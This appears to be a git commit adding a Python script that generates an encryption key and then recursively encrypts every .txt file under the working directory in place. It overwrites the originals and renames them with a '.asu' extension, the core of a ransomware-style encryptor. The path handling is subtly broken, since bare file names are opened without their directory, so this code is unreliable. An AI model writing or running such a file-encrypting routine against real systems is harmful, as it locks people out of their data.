6be2d93a23d2db44b4b10521b6c2264c166ea78a
Tomy Irawan <untukmilikku@gmail.com>
2024-01-02 01:10:56 +0700

    Encrypted file

---
+++ encrypted.py
@@ -0,0 +1,33 @@
+from cryptography.fernet import Fernet
+import os
+
+# Generate key
+key=Fernet.generate_key()
+
+# Save key to file
+with open("key.key","wb") as f:
+    f.write(key)
+
+# Create Fernet object with the generated key
+fernet = Fernet(key)
+
+# Encrypt content of text files
+for i in os.walk(os.getcwd()):
+    # print(i[2])
+    for j in i[2]:
+        if str(j).endswith(".txt"):
+            # print(j)
+            with open(str(j),"r") as f:
+                data=f.read()
+
+            encrypted = fernet.encrypt(data.encode())
+
+            with open(str(j),"wb") as f:
+                f.write(encrypted)
+
+            # print(encrypted)
+                
+            # add new extention
+            # base_name, current_extention = os.path.splitext(j)    
+            new_file_path =  j + ".asu"
+            os.rename(j, new_file_path)
